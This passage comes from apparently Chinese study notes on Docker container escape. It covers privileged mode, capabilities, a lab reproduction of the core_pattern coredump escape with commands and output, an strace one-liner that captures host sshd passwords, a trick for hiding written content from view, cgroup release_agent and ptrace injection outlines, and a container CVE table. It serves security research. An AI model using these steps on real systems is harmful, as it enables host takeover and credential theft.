<p><code>mknod</code>命令需要<code>CAP_MKNOD</code> capbility</p>
</blockquote>
<p>获取到主机文件系统之后的渗透动作：</p>
<ul>
<li>往<code>/etc/crontab</code>写入定时任务（要考虑是不是<code>systemd</code>接管了定时任务）</li>
<li>或者往<code>/root/.ssh/authorized_keys</code>下写入ssh密钥</li>
</ul>
<blockquote>
<p>上面这俩是安防软件的重点监控对象，操作需谨慎</p>
</blockquote>
<p><strong>原理</strong></p>
<p>Link: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.docker.com/reference/cli/docker/container/run/#privileged">https://docs.docker.com/reference/cli/docker/container/run/#privileged</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</a></li>
</ul>
<p><code>--privileged</code>标志会对容器启用以下功能：</p>
<ul>
<li>启用Linux内核的<strong>所有capabilities</strong></li>
<li>禁用默认的seccomp配置文件</li>
<li>禁用默认的AppArmor配置文件</li>
<li>禁用SELinux进程标签</li>
<li><strong>赋予访问所有宿主机设备的权限</strong></li>
<li>允许<code>/sys</code>读写</li>
<li>允许<code>cgroups</code>挂载读写</li>
</ul>
<blockquote>
<p>通过这个标志，容器基本上可以做到宿主机的所有行为</p>
</blockquote>
<p>Docker容器默认添加有以下capabilities（可通过<code>--cap-drop</code>去除）：</p>
<table>
<thead>
<tr>
<th align="left">Capability Key</th>
<th align="left">Capability Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">AUDIT_WRITE</td>
<td align="left">Write records to kernel auditing log.</td>
</tr>
<tr>
<td align="left">CHOWN</td>
<td align="left">Make arbitrary changes to file UIDs and GIDs (see chown(2)).</td>
</tr>
<tr>
<td align="left">DAC_OVERRIDE</td>
<td align="left">Bypass file read, write, and execute permission checks.</td>
</tr>
<tr>
<td align="left">FOWNER</td>
<td align="left">Bypass permission checks on operations that normally require the file system UID of the process to match the UID of the file.</td>
</tr>
<tr>
<td align="left">FSETID</td>
<td align="left">Don’t clear set-user-ID and set-group-ID permission bits when a file is modified.</td>
</tr>
<tr>
<td align="left">KILL</td>
<td align="left">Bypass permission checks for sending signals.</td>
</tr>
<tr>
<td align="left"><strong>MKNOD</strong></td>
<td align="left">Create special files using mknod(2).</td>
</tr>
<tr>
<td align="left">NET_BIND_SERVICE</td>
<td align="left">Bind a socket to internet domain privileged ports (port numbers less than 1024).</td>
</tr>
<tr>
<td align="left">NET_RAW</td>
<td align="left">Use RAW and PACKET sockets.</td>
</tr>
<tr>
<td align="left">SETFCAP</td>
<td align="left">Set file capabilities.</td>
</tr>
<tr>
<td align="left">SETGID</td>
<td align="left">Make arbitrary manipulations of process GIDs and supplementary GID list.</td>
</tr>
<tr>
<td align="left">SETPCAP</td>
<td align="left">Modify process capabilities.</td>
</tr>
<tr>
<td align="left">SETUID</td>
<td align="left">Make arbitrary manipulations of process UIDs.</td>
</tr>
<tr>
<td align="left">SYS_CHROOT</td>
<td align="left">Use chroot(2), change root directory.</td>
</tr>
</tbody></table>
<p>Docker容器默认没有下面的capabilities（可通过<code>--cap-add</code>添加）：</p>
<table>
<thead>
<tr>
<th align="left">Capability Key</th>
<th align="left">Capability Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">AUDIT_CONTROL</td>
<td align="left">Enable and disable kernel auditing; change auditing filter rules; retrieve auditing status and filtering rules.</td>
</tr>
<tr>
<td align="left">AUDIT_READ</td>
<td align="left">Allow reading the audit log via multicast netlink socket.</td>
</tr>
<tr>
<td align="left">BLOCK_SUSPEND</td>
<td align="left">Allow preventing system suspends.</td>
</tr>
<tr>
<td align="left"><strong>BPF</strong></td>
<td align="left">Allow creating BPF maps, loading BPF Type Format (BTF) data, retrieve JITed code of BPF programs, and more.</td>
</tr>
<tr>
<td align="left">CHECKPOINT_RESTORE</td>
<td align="left">Allow checkpoint&#x2F;restore related operations. Introduced in kernel 5.9.</td>
</tr>
<tr>
<td align="left">DAC_READ_SEARCH</td>
<td align="left">Bypass file read permission checks and directory read and execute permission checks.</td>
</tr>
<tr>
<td align="left">IPC_LOCK</td>
<td align="left">Lock memory (mlock(2), mlockall(2), mmap(2), shmctl(2)).</td>
</tr>
<tr>
<td align="left">IPC_OWNER</td>
<td align="left">Bypass permission checks for operations on System V IPC objects.</td>
</tr>
<tr>
<td align="left">LEASE</td>
<td align="left">Establish leases on arbitrary files (see fcntl(2)).</td>
</tr>
<tr>
<td align="left">LINUX_IMMUTABLE</td>
<td align="left">Set the FS_APPEND_FL and FS_IMMUTABLE_FL i-node flags.</td>
</tr>
<tr>
<td align="left">MAC_ADMIN</td>
<td align="left">Allow MAC configuration or state changes. Implemented for the Smack LSM.</td>
</tr>
<tr>
<td align="left">MAC_OVERRIDE</td>
<td align="left">Override Mandatory Access Control (MAC). Implemented for the Smack Linux Security Module (LSM).</td>
</tr>
<tr>
<td align="left">NET_ADMIN</td>
<td align="left">Perform various network-related operations.</td>
</tr>
<tr>
<td align="left">NET_BROADCAST</td>
<td align="left">Make socket broadcasts, and listen to multicasts.</td>
</tr>
<tr>
<td align="left">PERFMON</td>
<td align="left">Allow system performance and observability privileged operations using perf_events, i915_perf and other kernel subsystems</td>
</tr>
<tr>
<td align="left">SYS_ADMIN</td>
<td align="left">Perform a range of system administration operations.</td>
</tr>
<tr>
<td align="left">SYS_BOOT</td>
<td align="left">Use reboot(2) and kexec_load(2), reboot and load a new kernel for later execution.</td>
</tr>
<tr>
<td align="left">SYS_MODULE</td>
<td align="left">Load and unload kernel modules.</td>
</tr>
<tr>
<td align="left">SYS_NICE</td>
<td align="left">Raise process nice value (nice(2), setpriority(2)) and change the nice value for arbitrary processes.</td>
</tr>
<tr>
<td align="left">SYS_PACCT</td>
<td align="left">Use acct(2), switch process accounting on or off.</td>
</tr>
<tr>
<td align="left">SYS_PTRACE</td>
<td align="left">Trace arbitrary processes using ptrace(2).</td>
</tr>
<tr>
<td align="left">SYS_RAWIO</td>
<td align="left">Perform I&#x2F;O port operations (iopl(2) and ioperm(2)).</td>
</tr>
<tr>
<td align="left">SYS_RESOURCE</td>
<td align="left">Override resource Limits.</td>
</tr>
<tr>
<td align="left">SYS_TIME</td>
<td align="left">Set system clock (settimeofday(2), stime(2), adjtimex(2)); set real-time (hardware) clock.</td>
</tr>
<tr>
<td align="left">SYS_TTY_CONFIG</td>
<td align="left">Use vhangup(2); employ various privileged ioctl(2) operations on virtual terminals.</td>
</tr>
<tr>
<td align="left">SYSLOG</td>
<td align="left">Perform privileged syslog(2) operations.</td>
</tr>
<tr>
<td align="left">WAKE_ALARM</td>
<td align="left">Trigger something that will wake up the system.</td>
</tr>
</tbody></table>
<ul>
<li>添加&#x2F;去除这些capabilities时，添不添加<code>CAP_</code>前缀都一样</li>
<li>默认额的seccomp配置文件会自动适应所选择的capabilities</li>
</ul>
<h3 id="13-1-4-挂载特殊文件系统-proc"><a href="#13-1-4-挂载特殊文件系统-proc" class="headerlink" title="13.1.4 挂载特殊文件系统: &#x2F;proc"></a>13.1.4 挂载特殊文件系统: &#x2F;proc</h3><p>宿主机<code>proc</code>文件系统被挂载到了容器中，存在一个<code>/proc/sys/kernel/core_pattern</code>可以用于容器逃逸</p>
<blockquote>
<p>在Linux中，当进程崩溃时，系统内核将捕获进程崩溃信号并记录在（和二进制程序同一个文件夹下的）“core”文件中</p>
<p>“core”文件的默认名称的相关配置可以通过<code>/proc/sys/kernel/core_pattern</code>这个文件指定</p>
<p>man core(5): <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/core.5.html">https://man7.org/linux/man-pages/man5/core.5.html</a></p>
<p>&#x3D;&#x3D;关键词：coredump&#x3D;&#x3D;</p>
</blockquote>
<p>“core_pattern”文件的特点：当“core_pattern”的第一个字符为管道符<code>|</code>时，它会<strong>以root用户权限执行管道符后指定的文件</strong></p>
<p>在容器内寻找有没有core_pattern：<code>find / -name core_pattern</code></p>
<p>core_pattern原来的样子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ebpf@ebpf-workplace-VM:~$ cat /proc/sys/kernel/core_pattern </span><br><span class="line">|/usr/share/apport/apport -p%p -s%s -c%c -d%d -P%P -u%u -g%g -- %E</span><br></pre></td></tr></table></figure>

<p>故当宿主机的&#x2F;proc目录被挂载进容器时，可以通过修改该文件，达到触发coredump时宿主机执行一个bash脚本的效果</p>
<p>挂载宿主机proc文件系统，并启动一个容器：<code>sudo docker run -it -v /proc:/tmp/proc ubuntu /bin/bash</code></p>
<p>在容器找出本容器的diff文件夹在宿主机中的位置&#x3D;&#x3D;目的是得知bash脚本的绝对路径&#x3D;&#x3D;：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/overlay2/21dcb5a69ac6f5f39c5a10fd15878a5ad5abdfb7dc24ff2950638db33e213fd6/diff</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>/etc/mtab</code>这个文件最后指向容器进程自己的mount信息（<code>/proc/self/mounts</code>），目的是找出本容器的diff文件夹的位置</p>
</blockquote>
<p>当对容器文件进行更改时，会生成在宿主机对应的diff文件夹下生成对应的文件 -&gt; 在容器中创建一个bash脚本 -&gt; 宿主机对应<code>diff</code>文件夹下生成对应的bash脚本 -&gt; bash脚本路径可知 -&gt; 写到<code>/proc/sys/kernel/core_pattern</code>的管道符后 -&gt; 在容器内触发coredump -&gt; 宿主机执行创建的bash脚本</p>
<p><strong>实操</strong></p>
<p>在容器创建个bash（&#x3D;&#x3D;在容器根目录下比较方便？&#x3D;&#x3D;）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ada2816a9b96:/# cat &lt;&lt;EOF&gt;/my_bash</span><br><span class="line">&gt; #!/bin/bash</span><br><span class="line">&gt; touch /root/justafuckingtest</span><br><span class="line">&gt; EOF</span><br><span class="line"></span><br><span class="line">root@ada2816a9b96:/# cat my_bash </span><br><span class="line">#!/bin/bash</span><br><span class="line">touch /root/justafuckingtest</span><br><span class="line"></span><br><span class="line">root@ada2816a9b96:/# chmod +x /my_bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>到宿主机确认bash脚本已创建：<code>sudo cat /var/lib/docker/overlay2/21dcb5a69ac6f5f39c5a10fd15878a5ad5abdfb7dc24ff2950638db33e213fd6/diff/my_bash</code></p>
</blockquote>
<p>之后在容器中把bash脚本在宿主机的绝对路径写入core_pattern的管道符后面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ada2816a9b96:/# echo &quot;|/var/lib/docker/overlay2/21dcb5a69ac6f5f39c5a10fd15878a5ad5abdfb7dc24ff2950638db33e213fd6/diff/my_bash&quot;&gt;/tmp/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一个隐藏写入内容的做法：在脚本名后面添加<code>\r</code>与N多个空格（要能覆盖掉写入内容的长度，<code>echo</code>一定要加<code>-e</code>启用转义）</p>
<p>输入内容里存在<code>\r</code>，它意为将光标<strong>移至行首但不换行</strong>，在<code>\r</code>后每添加一个字符都会将行首的一个字符在显示上进行覆盖，但其实际内容不变，这可以达到隐藏内容的效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ebpf@ebpf-workplace-VM:~$ echo -e &quot;hide content\r                                                                 &quot;&gt;hidehide</span><br><span class="line">ebpf@ebpf-workplace-VM:~$ cat hidehide</span><br><span class="line"></span><br><span class="line">ebpf@ebpf-workplace-VM:~$ nano hidehide</span><br><span class="line"></span><br><span class="line"># 最后用编辑器打开hidehide，是可以发现存在内容的</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在容器内触发段错误：随便写一个指针错误的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># sgm.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *a = <span class="literal">NULL</span>;</span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>容器中不一定可以编译，可以通过在服务器上编译好再传进去</p>
<blockquote>
<p>我是直接通过宿主机在diff文件中编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ebpf@ebpf-workplace-VM:~$ sudo gcc /var/lib/docker/overlay2/21dcb5a69ac6f5f39c5a10fd15878a5ad5abdfb7dc24ff2950638db33e213fd6/diff/sgm.c -o /var/lib/docker/overlay2/21dcb5a69ac6f5f39c5a10fd15878a5ad5abdfb7dc24ff2950638db33e213fd6/diff/sgm</span><br></pre></td></tr></table></figure>
</blockquote>
<p>容器通过段错误触发coredump：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ada2816a9b96:/# ./sgm </span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>Linux内核执行<code>core_pattern</code>文件指定的行为，这里被挂载了宿主机<code>proc</code>文件系统的容器修改成了执行它的bash</p>
<p>检查bash执行结果，成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ebpf-workplace-VM:~# ll</span><br><span class="line">\u603b\u8ba1 24</span><br><span class="line">drwx------  4 root root 4096  4\u6708  7 10:35 ./</span><br><span class="line">drwxr-xr-x 20 root root 4096  2\u6708 29 15:19 ../</span><br><span class="line">-rw-r--r--  1 root root 3106 10\u6708 15  2021 .bashrc</span><br><span class="line">drwx------  2 root root 4096  2\u6708 23  2023 .cache/</span><br><span class="line">-rw-r--r--  1 root root    0  4\u6708  7 10:35 justafuckingtest</span><br><span class="line">-rw-r--r--  1 root root  161  7\u6708  9  2019 .profile</span><br><span class="line">drwx------  5 root root 4096  2\u6708 29 15:26 snap/</span><br></pre></td></tr></table></figure>



<h3 id="13-1-5-挂载特殊文件系统：-root"><a href="#13-1-5-挂载特殊文件系统：-root" class="headerlink" title="13.1.5 挂载特殊文件系统：&#x2F;root"></a>13.1.5 挂载特殊文件系统：&#x2F;root</h3><p><code>sudo docker run -it -v /root:/tmp/root ubuntu /bin/bash</code></p>
<p>无他，宿主机root文件夹都给了，直接在容器内向<code>/tmp/root/.ssh/authorized_keys</code>写入攻击者的ssh密钥</p>
<h3 id="13-1-6-添加特殊CAP：CAP-SYS-PTRACE"><a href="#13-1-6-添加特殊CAP：CAP-SYS-PTRACE" class="headerlink" title="13.1.6 添加特殊CAP：CAP_SYS_PTRACE"></a>13.1.6 添加特殊CAP：CAP_SYS_PTRACE</h3><p><strong>抓取sshd帐号密码</strong></p>
<blockquote>
<p>这种方法需要知道宿主机sshd进程号，因此需要容器与宿主机共用进程命名空间（<code>docker run --pid=host</code>）</p>
</blockquote>
<p>在容器内利用<code>strace</code>、<code>ptrace</code>等工具抓取宿主机sshd密码：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用数据捕获，之后 ctrl+C 停止</span></span><br><span class="line">strace -f -F -p ps aux|grep <span class="string">&quot;sshd -D&quot;</span>|grep -v grep|awk &#123;<span class="string">&#x27;print $2&#x27;</span>&#125; -t -e trace=<span class="built_in">read</span>,write -s 32 2&gt; sshd.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取相关数据</span></span><br><span class="line">grep -E <span class="string">&#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27;</span> sshd.log</span><br></pre></td></tr></table></figure>

<p>若服务器管理员在数据捕获期间通过ssh登陆，则可以抓取到明文密码&#x3D;&#x3D;未验证&#x3D;&#x3D;</p>
<blockquote>
<p>容器内不一定支持<code>strace</code>命令</p>
<ul>
<li>如可以，<code>apt</code>手动安装</li>
<li>自行静态编译一个strace上传</li>
</ul>
</blockquote>
<p><strong>进程注入</strong></p>
<p>通过<code>ptrace</code>系统调用以进程注入的形式来实现容器逃逸</p>
<p>具体是利用工具，将恶意elf注入到进程中：</p>
<ul>
<li>注入器：<a target="_blank" rel="noopener" href="https://github.com/dismantl/linux-injector">https://github.com/dismantl/linux-injector</a><ul>
<li>依赖fasm：<a target="_blank" rel="noopener" href="http://flatassembler.net/download.php">http://flatassembler.net/download.php</a></li>
</ul>
</li>
<li>恶意elf使用msf的马</li>
</ul>
<blockquote>
<p>理论上，使用<code>ptrace</code>系统调用的进程注入行为都可以</p>
</blockquote>
<p>剩下略</p>
<h3 id="13-1-7-添加特殊CAP：CAP-SYS-ADMIN"><a href="#13-1-7-添加特殊CAP：CAP-SYS-ADMIN" class="headerlink" title="13.1.7 添加特殊CAP：CAP_SYS_ADMIN"></a>13.1.7 添加特殊CAP：CAP_SYS_ADMIN</h3><p><code>sudo docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --rm -it ubuntu /bin/bash</code></p>
<p><strong>notify_on_release</strong></p>
<p>&#x3D;&#x3D;下面这些内容针对的是cgroup v1的版本&#x3D;&#x3D;</p>
<p>前提：</p>
<ul>
<li>以root用户身份在容器内运行</li>
<li>添加了<code>CAP_SYS_ADMIN</code> Linux capability</li>
<li>没有AppArmor限制</li>
<li>cgroup v1文件系统以读写方式安装在容器中</li>
</ul>
<p>子系统的<code>cgroup.procs</code>中指明了应用这个子系统的pid</p>
<p><code>cgroup</code>中有一个特殊机制<code>notify_on_release</code>：在<code>cgroup</code>下的子系统中都有着一个<code>notify_on_release</code>文件，当里面的值为1时，若该子系统中的所有进程都退出时，内核将会以root权限执行子系统中<code>release_agent</code>文件指定路径的文件</p>
<blockquote>
<p>如果将宿主机的<code>cgroup</code>挂载进容器，再修改<code>notify_on_release</code>与<code>release_agent</code>的值，即可达到容器逃逸的效果</p>
</blockquote>
<p>所以一般步骤就是：</p>
<ul>
<li>挂载宿主机的<code>cgroup</code>文件系统到容器中</li>
<li>创建一个新的<code>cgroup</code>子系统</li>
<li>修改<code>notify_on_release</code>，置1</li>
<li>容器中创建bash脚本，通过13.1.4的方法得到在宿主机中的绝对位置</li>
<li>绝对位置写入<code>release_agent</code></li>
<li>写入一个待会就会退出的进程PID号（可以用<code>$$</code>，当前shell）到<code>cgroup.procs</code></li>
<li>退出写入的PID进程</li>
<li>之后内核就会以root权限执行目标bash脚本</li>
</ul>
<p>&#x3D;&#x3D;未验证&#x3D;&#x3D;</p>
<p>关于v2的<code>release_agent</code>机制：</p>
<blockquote>
<p>v2版本的<code>cgroup</code>删去了<code>notify_on_release</code>以及<code>release_agent</code>这两个文件，改用<code>cgroup.events</code>文件发出子系统的状态变化信号。<code>cgroup.events</code>是一个只读文件&#x3D;&#x3D;不能直接通过echo等方式写入&#x3D;&#x3D;。</p>
<p><code>cgroup.events</code>文件有两个字段：</p>
<ul>
<li>populated: 1表示该子系统还有进程</li>
<li>frozen: 1表示该子系统及其子子被冻结</li>
</ul>
<p>可以通过类似于<a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man7/inotify.7.html">inotify(7)</a>这样的API进行监控（发出<code>IN_MODIFY</code>事件），或通过<a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/poll.2.html">poll(2)</a>这样的系统调用进行发出通知（返回字段<code>revents</code>中的<code>POLLPRI</code>和<code>POLLERR</code>位）</p>
</blockquote>
<h3 id="13-1-8-添加特殊CAP：CAP-SYS-MODULE"><a href="#13-1-8-添加特殊CAP：CAP-SYS-MODULE" class="headerlink" title="13.1.8 添加特殊CAP：CAP_SYS_MODULE"></a>13.1.8 添加特殊CAP：CAP_SYS_MODULE</h3><p>该权限允许容器在内核中加载内核.ko库文件，可通过加载恶意.ko库逃逸容器</p>
<ul>
<li>在容器中编译可能缺少编译环境</li>
<li>可以在外部服务器编译好再传进去</li>
</ul>
<h2 id="13-2-容器相关组件CVE"><a href="#13-2-容器相关组件CVE" class="headerlink" title="13.2 容器相关组件CVE"></a>13.2 容器相关组件CVE</h2><h3 id="13-2-0-关注的CVE列表"><a href="#13-2-0-关注的CVE列表" class="headerlink" title="13.2.0 关注的CVE列表"></a>13.2.0 关注的CVE列表</h3><table>
<thead>
<tr>
<th>编号</th>
<th>kernel版本</th>
<th>runC版本</th>
<th>containerd版本</th>
<th>Docker版本</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2018-15664</td>
<td></td>
<td></td>
<td></td>
<td>[17.06.0-ce, 17.12.1-ce:rc2]<br />[18.01.0-ce, 18.06.1-ce:rc2]</td>
</tr>
<tr>
<td>CVE-2019-5736</td>
<td></td>
<td>(, 1.0.0-rc6]</td>
<td></td>
<td>(, 18.09.2]</td>
</tr>
<tr>
<td>CVE-2019-14271</td>
<td></td>
<td></td>
<td></td>
<td>[19.03.0, 19.03.1)</td>
</tr>
<tr>
<td>CVE-2019-16884</td>
<td></td>
<td>(, 1.0.0-rc8]</td>
<td></td>
<td>(, 19.03.2]</td>
</tr>
<tr>
<td><del>CVE-2020-15257</del></td>
<td></td>
<td></td>
<td>(, 1.3.9)<br />[1.4.0, 1.4.3)</td>
<td></td>
</tr>
<tr>
<td>CVE-2021-30465</td>
<td></td>
<td>(, 1.0.0-rc94]</td>
<td></td>
<td></td>
</tr>
<tr>
<td>CVE-2022-0492</td>
<td>(, 5.17-rc3)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><del>CVE-2022-23648</del></td>
<td></td>
<td></td>
<td>(, 1.4.13)<br />[1.5.0, 1.5.10)<br />[1.6.0, 1.6.1)</td>
<td></td>
</tr>
<tr>
<td>CVE-2024-21626</td>
<td></td>
<td>[1.0.0-rc93, 1.1.11]</td>
<td>[1.4.7, 1.6.27]<br />[1.7.12, 1.7.12]</td>
<td>(, 25.0.2)</td>
</tr>
</tbody></table>
<p>拟搭建的环境：</p>
<ul>
<li><p>环境1：除CVE-2019-14271和CVE-2024-21626之外的所有CVE</p>
<ul>
<li><p>kernel: (, 5.17-rc3) - 5.15.0-102-generic</p>
</li>
<li><p>runC: (, 1.0.0-rc6]</p>
</li>
<li><p>containerd: (, 1.3.9)</p>
</li>
<li><p>Docker: [18.01.0-ce, 18.06.1-ce:rc2]</p>
</li>
</ul>
</li>
<li><p>环境2：CVE-2019-14271</p>
<ul>
<li><p>kernel: -</p>
</li>
<li><p>runC: -</p>
</li>
<li><p>containerd: -</p>
</li>
<li><p>Docker: [19.03.0, 19.03.1)</p>
</li>
</ul>
</li>
<li><p>环境3：CVE-2024-21626</p>
<ul>
<li>kernel: -</li>
<li>runC: [1.0.0-rc93, 1.1.11]</li>
<li>containerd: [1.7.12, 1.7.12]</li>
<li>Docker: (, 25.0.2)</li>
</ul>
</li>
</ul>
<p>已搭建环境：</p>
<ul>
<li>环境1（支持基于<code>libbpf</code>的eBPF开发环境）<ul>
<li>kernel: 5.15.0-102-generic</li>
<li>runC: 1.0.0-rc5</li>
<li>containerd: 1.0.3</li>
<li>Docker: 18.03.1-ce</li>
</ul>
</li>
</ul>
<p>&#x3D;&#x3D;最后环境以虚拟机快照为准&#x3D;&#x3D;</p>
<p>一个做了很多实验和收集了POC的Git：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/h4ckm310n/Container-Vulnerability-Exploit">https://github.com/h4ckm310n/Container-Vulnerability-Exploit</a></li>
</ul>
<p><del>13.2.1 Shocker攻击</del></p>
<p><del>从Docker容器逃逸并读取到主机某个目录的文件内容。Shocker攻击的关键是执行了系统调用<code>open_by_handle_at</code>函数，Linux手册中特别提到调用<code>open_by_handle_at</code>函数需要具备<code>CAP_DAC_READ_SEARCH</code>能力，而Docker1.0版本对Capability使用黑名单管理策略，并且没有限制<code>CAP_DAC_READ_SEARCH</code>能力，因而引发了容器逃逸的风险。</del></p>
<p><del>需要Docker版本 &lt; 1.0 &#x3D;&#x3D;？&#x3D;&#x3D;</del></p>
<blockquote>
<p>下面这些列出来的都是有Git POC或者博客解析的</p>
</blockquote>
<h3 id="13-2-1-CVE-2018-15664-TOCTTOU"><a href="#13-2-1-CVE-2018-15664-TOCTTOU" class="headerlink" title="13.2.1 CVE-2018-15664 - TOCTTOU"></a>13.2.1 CVE-2018-15664 - TOCTTOU</h3><p>Blog: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2098610">https://cloud.tencent.com/developer/article/2098610</a></li>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000044032624">https://segmentfault.com/a/1190000044032624</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/443811755">https://zhuanlan.zhihu.com/p/443811755</a></li>
</ul>
<p>POC: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Metarget/cloud-native-security-book/tree/473a5642e95378c5640a480a1c26ceb340621791/code/0302-%E5%BC%80%E5%8F%91%E4%BE%A7%E6%94%BB%E5%87%BB/02-CVE-2018-15664/symlink_race">https://github.com/Metarget/cloud-native-security-book/tree/473a5642e95378c5640a480a1c26ceb340621791/code/0302-%E5%BC%80%E5%8F%91%E4%BE%A7%E6%94%BB%E5%87%BB/02-CVE-2018-15664/symlink_race</a></li>
</ul>
<p><strong>背景</strong></p>
<p><code>docker cp</code>命令：用于在容器和宿主机文件系统间进行文件或目录复制</p>
<p><code>docker cp container_id:file_path_in_container host_path</code></p>
<p>符号链接：Linux系统中的一种文件，它指向系统中的另一个文件或目录</p>
<p>TOCTTOU、竞争条件（race condition）</p>
<p><code>FollowSymlinkInScope()</code>函数，作用是解析容器中运行进程的文件路径，比如<code>docker cp</code>命令</p>
<p>攻击者可以利用<strong>解析校验完成后和操作执行间的空隙</strong>修改cp文件为一个符号链接对应的目标文件</p>
<p>理论上该攻击者可能会以root身份访问到host上或其他容器内的任意文件</p>
<p><strong>原理</strong></p>
<p>Docker会将<code>docker cp</code>进行文件复制的行为分为先后两个部分：<strong>路径检查</strong>和<strong>命令解析</strong>。当用户执行<code>docker cp</code>命令后，Docker守护进程收到这个请求，首先会对用户给出的复制路径进行检查。如果路径中有容器内部的符号链接，则先在容器内部将其解析成路径字符串，之后再进行命令的解析</p>
<p>如果在Docker守护进程检查复制路径时，攻击者可以利用中间的间隙，先在这里放置一个非符号链接的常规文件或目录，检查结束后，攻击者赶<strong>在Docker守护进程使用这个路径之前将其替换为一个符号链接</strong>，那么这个符号链接就会于被打开时在宿主机上解析，从而导致目录穿越</p>
<p><strong>复现</strong></p>
<p>环境：Docker 18.03.1</p>
<p>POC内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./</span><br><span class="line">├── build</span><br><span class="line">│   ├── Dockerfile</span><br><span class="line">│   └── symlink_swap.c</span><br><span class="line">├── run_read.sh</span><br><span class="line">└── run_write.sh</span><br></pre></td></tr></table></figure>



<p>Dockerfile: 构造恶意容器</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Build the binary.</span></span><br><span class="line"><span class="keyword">FROM</span> opensuse/leap</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> zypper <span class="keyword">in</span> -y gcc glibc-devel-static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /builddir</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> symlink_swap.c /builddir/symlink_swap.c</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up our malicious rootfs.</span></span><br><span class="line"><span class="keyword">FROM</span> 